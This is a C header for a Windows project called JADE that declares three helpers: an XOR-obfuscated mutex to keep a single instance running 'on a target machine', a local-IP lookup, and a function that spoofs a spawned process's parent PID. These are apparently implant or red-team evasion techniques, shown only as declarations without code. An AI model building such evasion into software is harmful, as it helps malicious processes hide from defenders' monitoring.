// JADE.h - Header file for all the Custom functions for the Windows JADE project
#ifndef _WIN32_WINNT            // Specifies that the minimum required platform is Windows Vista.
#define _WIN32_WINNT 0x0600     // Change this to the appropriate value to target other versions of Windows.
#endif
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>

#pragma once


/* Takes a pointer to a HANDLE and a 4 byte char array in order to
	generate an XOR'd mutex. This can be used to ensure only one
	process is executing at any given time on a target machine.
	Returns a handle to the created mutex. Use GetLastError()
	to determine if ERROR_ALREADY_EXISTS is returned.*/
extern HANDLE XOR_Mutex(char xorkey[5]);

/*	Takes a char pointer and determines the best local IP address based
	off of determining the interface to route to 8.8.8.8. This will effectively
	choose the interface with the default gateway. Returns 0 on success or a
	-1 on error.*/
extern DWORD GetLocalIP(char* ipstr);

/* Function that aids in spoofing the parent pid for a to-be-spawned process.
	Requires a pointer to the STARTUPINFOEX structure as well as a const char 
	pointer. The lpAttributeList attribute of the STARTUPINFOEX struct will be
	updated with new parent pid property.
	Returns 0 on success and -1 on error.*/
extern int SpoofParent(char* commandline, const char* parent_req);